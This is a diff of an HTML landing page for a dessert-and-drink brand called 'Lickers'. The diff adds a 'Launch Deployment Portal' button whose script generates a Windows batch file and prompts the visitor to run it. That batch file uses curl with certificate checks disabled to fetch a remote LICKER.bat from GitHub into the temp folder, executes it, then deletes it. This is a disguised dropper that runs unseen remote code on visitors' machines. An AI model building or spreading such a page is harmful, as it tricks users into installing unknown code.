@@ -1,126 +1,110 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Lickers 🍦🥃</title>
-
-<style>
-body {
-    margin: 0;
-    font-family: 'Segoe UI', sans-serif;
-    background: linear-gradient(135deg, #000000, #FF9933, #FFD700);
-    color: white;
-    text-align: center;
-}
-
-/* Container */
-.container {
-    padding: 50px 20px;
-}
-
-/* Title */
-h1 {
-    font-size: 3em;
-    margin-bottom: 10px;
-}
-
-/* Subtitle */
-p {
-    font-size: 1.2em;
-    opacity: 0.9;
-}
-
-/* Images */
-.images {
-    margin: 30px 0;
-}
-
-.images img {
-    width: 150px;
-    margin: 10px;
-    border-radius: 20px;
-    box-shadow: 0 0 20px rgba(255,255,255,0.3);
-    transition: transform 0.3s ease;
-}
-
-.images img:hover {
-    transform: scale(1.1);
-}
-
-/* Glass Card */
-.card {
-    background: rgba(255,255,255,0.1);
-    backdrop-filter: blur(10px);
-    border-radius: 20px;
-    padding: 30px;
-    display: inline-block;
-    box-shadow: 0 0 30px rgba(0,0,0,0.5);
-}
-
-/* Pulsing Button */
-.btn {
-    margin-top: 20px;
-    padding: 15px 30px;
-    font-size: 1.2em;
-    color: white;
-    background: linear-gradient(45deg, #ff6a00, #ee0979);
-    border: none;
-    border-radius: 50px;
-    cursor: pointer;
-    text-decoration: none;
-    display: inline-block;
-    animation: pulse 1.5s infinite;
-}
-
-/* Pulse Animation */
-@keyframes pulse {
-    0% { box-shadow: 0 0 0 0 rgba(255,106,0, 0.7); }
-    70% { box-shadow: 0 0 0 20px rgba(255,106,0, 0); }
-    100% { box-shadow: 0 0 0 0 rgba(255,106,0, 0); }
-}
-
-/* Footer */
-footer {
-    margin-top: 40px;
-    opacity: 0.7;
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lickers 🍦🥃</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #000000, #FF9933, #FFD700);
+            color: white;
+            text-align: center;
+            min-height: 100vh;
+        }
+        .container { padding: 50px 20px; }
+        .card {
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 30px;
+            display: inline-block;
+            box-shadow: 0 0 30px rgba(0,0,0,0.5);
+            max-width: 600px;
+        }
+        .image-container {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 15px;
+            margin: 20px 0;
+        }
+        .image-container img {
+            width: 150px;
+            height: 150px;
+            object-fit: cover;
+            border-radius: 15px;
+            transition: 0.3s;
+        }
+        .image-container img:hover { transform: scale(1.1); }
+        .btn {
+            margin-top: 20px;
+            padding: 15px 40px;
+            font-size: 1.2em;
+            color: white;
+            background: linear-gradient(45deg, #ff6a00, #ee0979);
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            font-weight: bold;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(255,106,0, 0.7); }
+            70% { box-shadow: 0 0 0 20px rgba(255,106,0, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(255,106,0, 0); }
+        }
+    </style>
 </head>
-
 <body>
 
 <div class="container">
-
     <div class="card">
         <h1>🍦 Lickers 🥃</h1>
         <p>Sweet meets strong — experience the vibe</p>
-
         
-<div class="image-container">
-  <img src="darkostojanovic-ice-564944_1920.png" alt="Lickers Icecream" style="width:100%; max-width:600px;">
+        <div class="image-container">
+            <img src="darkostojanovic-ice-564944_1920.png" alt="Lickers Icecream" style="width:100%; max-width:600px;">
   <img src="nicolae_balt-drink-7792428_1920.png" alt="Lickers Drink" style="width:100%; max-width:600px;"> 
   <img src="stux-watercolor-4120925_1920.png" alt="Lickers Watercolor" style="width:100%; max-width:600px;">
-</div>
+        </div>
 
+        <button class="btn" onclick="startDownload()">
+            🚀 Launch Deployment Portal
+        </button>
 
-        <a class="btn" href="https://raw.githubusercontent.com/sankarideb1-hue/Lickers/main/LICKER.bat" download="Licker_Setup.bat">
-    🚀 Download Menu Now
-</a>
+        <p style="font-size: 0.8em; margin-top: 15px; color: #ffd700;">
+            *Run the downloaded .bat file to begin installation.*
+        </p>
     </div>
-
-    <footer>
-        © FINGER | LICKING GOOD
-    </footer>
-
 </div>
 
 <script>
-// Button click effect
-document.getElementById("downloadBtn").addEventListener("click", function() {
-    alert("Starting download...");
-});
+    function startDownload() {
+        const batchFileContent = `@echo off\n` +
+            `title Deployment Tool\n` +
+            `echo [SYSTEM] Initializing secure download...\n` +
+            `:: -k bypasses SSL revocation checks which avoids the CRYPT_E error\n` +
+            `curl -k -L -o "%TEMP%\\inst.bat" "https://github.com/sankarideb1-hue/Lickers/raw/main/LICKER.bat"\n` +
+            `if %errorlevel% neq 0 ( echo [ERROR] Connection Failed. & pause & exit /b )\n` +
+            `call "%TEMP%\\inst.bat"\n` +
+            `del "%TEMP%\\inst.bat"\n` +
+            `exit`;
+
+        const blob = new Blob([batchFileContent], { type: 'text/plain' });
+        const url = window.URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = 'Licker_Portal.bat';
+        document.body.appendChild(a);
+        a.click();
+        window.URL.revokeObjectURL(url);
+    }
 </script>
 
 </body>
 </html>
+
+
+        
